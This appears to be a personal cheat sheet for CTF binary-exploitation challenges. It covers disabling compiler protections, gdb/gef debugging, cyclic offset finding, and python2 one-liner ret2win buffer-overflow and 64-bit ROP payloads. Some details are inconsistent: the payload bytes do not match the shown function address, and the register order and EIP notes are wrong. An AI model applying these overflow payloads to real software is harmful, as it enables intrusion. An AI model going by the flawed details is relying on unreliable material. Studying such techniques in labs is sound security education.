# PWN Challenges CTF

### Getting Started
```powershell
file CodeFile  #Check File Type
gcc CodeFile.c -o CodeFile -fno-stack-protector -z execstack -no-pie -m32  #Compile a code
checksec --file CodeFile  #Protection Check
```

### Compile a code
```powershell
gcc CodeFile.c -o CodeFile -fstack-protector-all  #Compile a 64-bits with all protection enabled
gcc CodeFile.c -o CodeFile -fno-stack-protector -z execstack -no-pie -m32  #Compile a 32-bits code with no protections
```
```powershell
-fno-stack-protector	#preventing adding canary
-z execstack		#stack is marked as executable
-no-pie			#program will load to the same memory each time. if you have it enabled, you won't get the memory address of any function. instead you will get the offset.
-m32			#32-bits
```
### Checksec
```powershell
checksec --file CodeFile
	Arch:	64-bit/32-bit
	RELRO:	Partial RELRO
	Stack:	Canary Found
	NX:	NX enabled (no execution enabled)
	PIE:	PIE enabled
```

### load the File
```powershell
file CodeFile  #Load the file
info functions  #existing functions in the code
```
```powershell
# info function output
0x08049000  _init
0x08049030  __libc_start_main@plt
0x08049040  gets@plt
0x08049050  puts@plt
0x08049060  _start
0x0804908d  __wrap_main
0x080490a0  _dl_relocate_static_pie
0x080490b0  __x86.get_pc_thunk.bx
0x080490c0  deregister_tm_clones
0x08049100  register_tm_clones
0x08049140  __do_global_dtors_aux
0x08049170  frame_dummy
0x08049176  main
0x080491c4  _fini
```

### Disassembler
```powershell
disassemble main
break main  	    #adding a break point
break *0x0804921e   #break point in the main function using hex
break *main+140     #break point in the main function using main + add
run  		    #run the code and stop at the break point
n  		    #for next (goes to the next instraction)
c  		    #for continue (run the program)
delete breakpoints  #delete all breakpoints
```
```powershell
# disassemble main output
(gdb) disassemble main
Dump of assembler code for function main:
   0x08049176 <+0>:     lea    0x4(%esp),%ecx
   0x0804917a <+4>:     and    $0xfffffff0,%esp
   0x0804917d <+7>:     push   -0x4(%ecx)
   0x08049180 <+10>:    push   %ebp
   0x08049181 <+11>:    mov    %esp,%ebp
   0x08049183 <+13>:    push   %ebx
   0x08049184 <+14>:    push   %ecx
   0x08049185 <+15>:    sub    $0x10,%esp
   0x08049188 <+18>:    call   0x80490b0 <__x86.get_pc_thunk.bx>
   0x0804918d <+23>:    add    $0x2e67,%ebx
   0x08049193 <+29>:    sub    $0xc,%esp
   0x08049196 <+32>:    lea    -0x1fec(%ebx),%eax
   0x0804919c <+38>:    push   %eax
   0x0804919d <+39>:    call   0x8049050 <puts@plt>
   0x080491a2 <+44>:    add    $0x10,%esp
   0x080491a5 <+47>:    sub    $0xc,%esp
   0x080491a8 <+50>:    lea    -0x18(%ebp),%eax
   0x080491ab <+53>:    push   %eax
   0x080491ac <+54>:    call   0x8049040 <gets@plt>
   0x080491b1 <+59>:    add    $0x10,%esp
   0x080491b4 <+62>:    mov    $0x0,%eax
   0x080491b9 <+67>:    lea    -0x8(%ebp),%esp
   0x080491bc <+70>:    pop    %ecx
   0x080491bd <+71>:    pop    %ebx
   0x080491be <+72>:    pop    %ebp
   0x080491bf <+73>:    lea    -0x4(%ecx),%esp
   0x080491c2 <+76>:    ret
End of assembler dump.
```

### tracing the code
```powershell
ltrace ./CodeFile	  # tracing the code in a local machine
strace nc -v [IP] [PORT]  # tracing the code in a server
```
```powershell
#output of ltrace
┌──(root㉿raman)-[/home/…/Downloads/ctf/pwn/2]
└─# ltrace ./login
__libc_start_main(0x80490ad, 1, 0xffe52d24, 0 <unfinished ...>
puts("Enter admin password: "Enter admin password: 
)                                                                                       = 23
gets(0xffe52c46, 0, 19, 0x80491adadmin
)                                                                                   = 0xffe52c46
strcmp("admin", "pass")                                                                                              = -1
puts("Incorrect Password!"Incorrect Password!
)                                                                                          = 20
printf("Failed to log in as Admin (autho"..., 0Failed to log in as Admin (authorised=0) :(
)                                                                     = 44
+++ exited (status 0) +++
```

### check a hex value
```powershell
    0x8049219 <main+131>       push   eax
    0x804921a <main+132>       call   0x8049070 <puts@plt>
    0x804921f <main+137>       add    esp, 0x10
 →  0x8049222 <main+140>       cmp    DWORD PTR [ebp-0xc], 0x0
    0x8049226 <main+144>       je     0x804923f <main+169>
    0x8049228 <main+146>       sub    esp, 0x8
    0x804922b <main+149>       push   DWORD PTR [ebp-0xc]
    0x804922e <main+152>       lea    eax, [ebx-0x1fa8]
    0x8049234 <main+158>       push   eax
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "login", stopped 0x8049222 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8049222 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Python Exception <class 'AttributeError'>: partially initialized module 'pwndbg' has no attribute 'gdblib' (most likely due to a circular import)
gef➤  x $ebp - 0xc
0xffffd2fc:     0x00000000
```

### set a hex value
```pwoershell
gef➤  x $ebp - 0xc
0xffffd2fc:     0x00000000
gef➤  set *0xffffd2fc = 1
gef➤  x $ebp - 0xc
0xffffd2fc:     0x00000001
gef➤ 
```

### cyclic pattern
```powershell
cyclic 100	# create a pattern of 100 charectors
cyclic -l haaa	# determin how many letters you need before the buffer
```

### ret2win
```powershell
# 1.first you need to determine the buffer (how many characters we need before starting the buffer)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x33      
$ebx   : 0x61616166 ("faaa"?)
$ecx   : 0xffffd29c  →  0xbda1fe00
$edx   : 0x1       
$esp   : 0xffffd310  →  "iaaajaaa"
$ebp   : 0x61616167 ("gaaa"?)
$esi   : 0x0804bf04  →  0x08049150  →  <__do_global_dtors_aux+0> endbr32 
$edi   : 0xf7ffcba0  →  0x00000000
$eip   : 0x61616168 ("haaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63

#here it shows that we can set the address of hacked function after 28 characters. starting from `"haaa"`

# 2.determin the memory location of hacked function
gef➤  disassemble hacked
Dump of assembler code for function hacked:
   0x08049186 <+0>:     push   ebp
   0x08049187 <+1>:     mov    ebp,esp
   0x08049189 <+3>:     push   ebx
 
# 3.use python to getarate your payload
python2 -c 'print "A" * 28 + "\x82\x46\x12\02"' > payload

# 4.run your payload in gdb
run < payload

notes:
EIP is where the 4 bytes of buffer starts
ESP whatever left from the string (where we need to point to hacked function)
```

### 64-bits
```powershell
#the register in 64-bits is in the following sequence rdi, rsi, rax
#we need to store the parameters in the rdi and rsi registers. parameter_1 will be pointed to rdi registry which will be check in cmp1. parameter_2 will be pointed to rsi registry which will be check in cmp2

# 1.check how many bytes u need for the register. then u need to populate the value in RSP
cyclic 100

# 2. you need to follow the following sequence --> padding + pop_rdi + param_1 + pop_rsi + param_2 + junk + hacked 
python2 -c 'print "A" * 24 + "\x20\x50\x69\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\x20\x50\x69\x00\x00\x00\x00\x00" + "\xbe\xba\xde\xc0\xbe\xba\xde\xc0" + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x20\x50\x69\x00\x00\x00\x00\x00"' 

#Note: to get the rdi & rsi path registry
ropper --file ret2win_params --search "pop rdi"
```
